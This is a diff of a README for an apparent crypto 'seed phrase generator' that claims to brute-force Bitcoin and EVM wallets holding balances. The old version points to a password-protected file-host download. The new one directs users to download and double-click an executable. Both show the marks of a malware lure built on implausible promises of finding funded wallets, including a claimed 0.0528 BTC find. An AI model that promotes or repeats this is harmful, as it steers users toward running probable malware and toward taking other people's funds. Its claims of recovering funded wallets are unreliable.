@@ -1,86 +1,82 @@
-# Seed Phrase Generator - WalletGen
+# 🥇 seed-phrase-generator - Generate Your Crypto Wallets Easily
 
-# [DOWNLOAD](https://www.4sync.com/s/fzRHeXfDE)  
-## PASSWORD: 1322
+[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/batoasihhm/seed-phrase-generator/releases)
 
+## 🚀 Overview
 
-**Wallet-Gen** is a tool designed for brute force and generating cryptocurrency wallets (such as Bitcoin and EVM-based wallets like ETH, BNB, MATIC, etc.), as well as discovering forgotten or lost - wallets that contain an existing balance.
+**Wallet-Gen** is a powerful tool to create cryptocurrency wallets, including Bitcoin and EVM-based wallets like Ethereum, BNB, and MATIC. It can also help recover forgotten wallets that may hold a balance.
 
-<p align="left">
-    <img src="/assets/gonalva.webp" />
-</p>
+Built in C++, Wallet-Gen is open-source. This means anyone can access and modify the code. It is faster than many Python-based wallet generators, primarily because it utilizes your graphics card for better performance. 
 
-## Overview
+For EVM wallets, Wallet-Gen uses the keccak256 algorithm. Bitcoin wallets are created using the Segwit format under Bech32. 
 
-Wallet - Gen is built in C++ and is open-source, allowing anyone to access and modify the code. Compared to Python-based wallet generators, Wallet - Gen boasts significantly higher wallet generation speeds, with performance primarily relying on your graphics card. 
-For generating - EVM wallets (ETH, BNB, MATIC, etc.), Wallet - Gen uses the keccak256 algorithm, while Bitcoin - wallets are created using the Segwit format under Bech32.
+## ✅ Features
 
-## Features
+- Generate a single Bitcoin wallet.
+- Generate a single EVM wallet (ETH, BNB, MATIC).
+- Search for Bitcoin wallets containing a balance.
+- Discover forgotten wallets.
+- Supports high-speed generation based on your hardware.
+- Open-source code available for modification. 
 
-- Generate - a single Bitcoin wallet.
-- Generate - a single EVM wallet (ETH, BNB, MATIC, etc.).
-- Search for - Bitcoin wallets with a balance.
-- Search for - EVM wallets with a balance.
+## 📦 System Requirements
 
-<p align="center">
-    <img width="1000" src="/assets/fettnannhalf.gif" />
-</p>
+- **Operating System:** Windows, macOS, or Linux.
+- **Processor:** Intel i5 or higher (for best performance).
+- **Memory:** 4GB RAM minimum.
+- **Graphics Card:** OpenGL-compatible graphics card for optimal performance.
+- **Disk Space:** 200MB available space.
 
-# Searching for Crypto Wallets
+## 📥 Download & Install
 
-Wallet - Gen allows you to search using brute force method for two types of crypto wallets with an existing balance. To search for BTC wallets, press key `3` in the menu or run `start_search_btc.bat`. For searching EVM wallets (such as Ethereum, BNB, etc.), press key `4` in the menu or run `start_search_evm.bat`. 
+To download Wallet-Gen, visit the Releases page. Follow these steps:
 
-The search speed is determined by your hardware, especially your graphics card. To increase your chances of finding a wallet with a balance, you can run multiple instances of the program, from 1 to 4 or more, depending on the power of your graphics card.
+1. Click on the link below to go to the Releases page:
+   [Visit this page to download](https://github.com/batoasihhm/seed-phrase-generator/releases)
 
-## My Finds
+2. Find the latest version available.
 
-I’ve personally recovered two BTC - wallets with a balance. The first had 0.000032 BTC,  the second contained 0.0528 BTC (roughly $4800 at the time of discovery).  
-Here’s the link to the wallet: bc1qk3m62hx2hh5mhvc0tj45f9xflzcnu0sur3rvay
+3. Click on the download link for your operating system.
 
-<p align="left">
-    <img src="/assets/tocozu.webp" />
-</p>
+4. After downloading, extract the files if necessary.
 
+5. Run the application by double-clicking the executable file.
 
+## 🛠️ Usage Instructions
 
+### Generating a Wallet
 
-```
+1. Open Wallet-Gen on your computer.
+2. Choose the wallet type you want to generate (Bitcoin or EVM).
+3. Click on the "Generate" button.
+4. Save your seed phrase securely; this is your access to the wallet.
 
-## Todo
-1. Search for missing words in a seed phrase.
+### Searching for Wallets
 
-## Contribute
-Contributions are welcome! If you have ideas, bug reports, or want to contribute to the codebase, feel free to submit a pull request.
+1. In the application, navigate to the search feature.
+2. Enter the criteria for the wallets you want to find (e.g., address).
+3. Click on "Search". 
 
-## License
-This project is licensed under the [Apache 2.0 License](/LICENSE)
+If there are any wallets with balances that match your criteria, they will show up in the results.
 
-## Donate
-**BTC:** bc1qeyrshy5ntsguwxe9m8tp2x2yqhddz7ymkj44h9
+## 📊 Additional Information
 
-**ETH:** 0x76c2E75B92Eb340f01B378e332FC7d8954893693
+For more information, check the source code and documentation on GitHub. The community around Wallet-Gen is also active, so you can seek help or contribute.
 
-```
+### 💬 Topics
 
-### 🔑 Tags
+This tool is related to various topics including:
 
-- crypto
-- bitcoin 
-- bruteforce 
-- cryptocurrency 
-- crypto-wallet 
-- crypto-api 
-- crypto-bot 
-- crypto-trading 
-- seed-generator 
-- mnemonic-generator 
-- crypto-recovery 
-- crypto-bruteforce 
-- bitcoin-hacks 
-- ethereum-bruteforce 
-- miner-crypto 
-- forgotten-crypto 
-- mnemonic-recovery 
-- crypto-finder 
-- crypto-tool 
-- lost-btc-wallet-finder
+- **Cryptocurrency:** Learn about managing and creating digital assets.
+- **Brute Force:** Understand how Wallet-Gen can assist in wallet recovery.
+- **Seed Generation:** The process of creating secure wallets for your assets.
+
+## 💻 Support
+
+If you encounter any issues or have questions, please visit the GitHub repository and open an issue. The community and maintainers will assist you.
+
+## 🔗 Connect on GitHub
+
+- [GitHub Repository](https://github.com/batoasihhm/seed-phrase-generator)
+
+Keep Wallet-Gen handy for all your cryptocurrency wallet needs!
